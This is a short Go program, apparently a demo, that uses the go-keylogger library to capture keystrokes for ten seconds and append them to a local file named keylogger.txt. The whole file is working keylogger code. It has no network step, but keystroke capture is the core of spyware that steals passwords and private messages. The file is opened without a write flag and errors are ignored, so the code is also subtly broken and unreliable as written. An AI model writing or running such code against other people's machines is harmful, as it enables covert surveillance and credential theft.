package main

import (
	keylogger2 "github.com/kindlyfire/go-keylogger"
	"os"
	"time"
)

func main() {
	keylogger := keylogger2.NewKeylogger()

	startTimer := time.Now()
	file, _ := os.OpenFile("keylogger.txt", os.O_CREATE|os.O_APPEND, 0666)
	defer file.Close()

	for {
		key := keylogger.GetKey()

		if !key.Empty {
			file.WriteString(string(key.Rune))
		}

		duration := time.Since(startTimer)

		if duration > 10*time.Second {
			break
		}

		time.Sleep(10 * time.Millisecond)

	}

}
